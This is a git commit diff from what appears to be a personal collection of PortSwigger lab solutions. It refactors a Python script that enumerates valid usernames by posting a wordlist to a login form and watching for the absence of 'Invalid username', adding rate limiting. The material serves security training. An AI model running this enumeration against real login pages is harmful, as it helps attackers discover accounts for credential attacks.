6ce0ce03056579dc6fb08c7e8e0afd6f53146013
Michael George <michael.g.george@gmail.com>
2022-11-02 04:27:15 +0530

    Add make_user_call to script, username_diff_res, auth

--- portswigger/auth/username_diff_res/script.py
+++ portswigger/auth/username_diff_res/script.py
@@ -14,17 +14,21 @@ cookies = {
     'session': 'EaPnUa21exELsUbGQqJUqSUjiFfRbwyF'
 }
 
-
-def user_enum(url, user_file_list, headers, cookies):
-    with Path(user_file_list).open('r') as file:
-        lines = file.readlines()
-        for line in lines:
-            res = post(
+@sleep_and_retry
+@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
+def make_user_call(url, line, headers, cookies):
+    return post(
                 url=url, 
                 data={'username': line, 'password': 'asdf'},
                 headers=headers,
                 cookies=cookies
             )
+
+def user_enum(url, user_file_list, headers, cookies):
+    with Path(user_file_list).open('r') as file:
+        lines = file.readlines()
+        for line in lines:
+            res = make_user_call(url, line, headers, cookies)
             if 'Invalid username' not in res.text:
                 return line
 
